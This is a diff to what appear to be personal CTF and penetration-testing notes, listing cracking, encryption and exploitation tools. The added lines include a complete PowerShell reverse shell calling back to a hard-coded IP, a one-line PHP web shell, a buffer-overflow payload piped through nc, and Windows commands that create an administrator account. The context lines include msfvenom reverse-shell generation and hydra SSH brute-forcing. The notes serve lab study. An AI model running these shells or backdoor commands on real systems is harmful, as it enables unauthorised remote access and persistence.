@@ -3,6 +3,7 @@
 #### CLI Tools
 
 - Bruteforce
+
   - [hashcat](https://hashcat.net/hashcat/)
   - [john](https://github.com/openwall/john)
     - ```bash
@@ -26,6 +27,7 @@
     - SSH
       ``hydra -l `<username>` -P `<full path to pass>` MACHINE_IP -t 4 ssh``
 - Encryption/Decryption
+
   - [gpg](https://gnupg.org/) (GNU Privacy Guard)
     - Encrypt: ``gpg --symmetric --cipher-algo CIPHER message.txt``
     - Decrypt: ``gpg --output original_message.txt --decrypt message.gpg``
@@ -34,6 +36,7 @@
     - CSR
       ``openssl req -new -nodes -newkey rsa:4096 -keyout key.pem -out cert.csr``
 - Python Tools
+
   * python to exe
     * [PyInstaller](http://www.pyinstaller.org/)
     * [py2exe](https://pypi.python.org/pypi/py2exe/0.9.2.0)
@@ -45,6 +48,10 @@
   * [Paramiko](https://www.paramiko.org/index.html)
     ``pip install paramiko``
 - [md5sum](https://en.wikipedia.org/wiki/Md5sum#:~:text=md5sum%20is%20a%20computer%20program,have%20any%20given%20MD5%20hash.)
+- [xfreerdp](https://www.freerdp.com/)
+
+  - `sudo apt-get install freerdp2-x11`
+  - `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.31.212 /u:Administrator /p:'TryH4ckM3!'`
 - 
 
 #### Online Tools
@@ -54,6 +61,15 @@
 - [cyberchef](https://gchq.github.io/CyberChef/)
 - [sms-pdu-to-text](https://www.diafaan.com/sms-tutorials/gsm-modem-tutorial/online-sms-pdu-decoder/)
 - [https://www.alpertron.com.ar/JAVAPROG.HTM](https://www.alpertron.com.ar/JAVAPROG.HTM)
+
+#### Binary Exploitation
+
+* Payloads
+  * `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x69\xfe\xca\x00" + b"\x69\x15\x00\x00")' | nc ip port`
+* Resources
+  * [Liveoverflow](https://youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&feature=shared)
+  * [Cryptocat](https://youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&feature=shared)
+* 
 
 #### Defensive Security
 
@@ -297,7 +313,9 @@
       `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=listen-IP LPORT=listen-port`
     * Payloads
       * Staged Payloads (`/`)
+        (Better for evading firewalls)
       * Stageless Payloads (`_`)
+        (Can be caught using `nc` listener instead of `multi/handler`)
     * `msfvenom --list payloads`
     * `msfvenom --list payloads | grep "some_payload"`
   * portscan
@@ -311,8 +329,19 @@
   * kiwi
 * [searchsploit](https://www.exploit-db.com/searchsploit)
 * [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+  * Windows Powershell Reverse Shell
+
+    ```
+    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.17.69.74',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    ```
 * [impacket](https://github.com/fortra/impacket)
 * Web Shells
+
+  * ```php
+    <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+    ```
+* [Staged vs Stageless Payloads](https://blog.spookysec.net/stage-v-stageless-1/)
 * 
 
 #### Priviledge Escalation
@@ -427,7 +456,12 @@
     * Copy it to the mounted directory
     * Execute it from target machine (shell)
 * Windows
-  * `type flag.txt`
+  * Print
+    `type flag.txt`
+  * Create a new user
+    `net user username password /add`
+  * Add the user to administrator group
+    `net localgroup administrators username /add`
   * `schtasks`
     * `schtasks /query /tn task_name /fo list /v`
     * `schtasks /run /tn task_name`
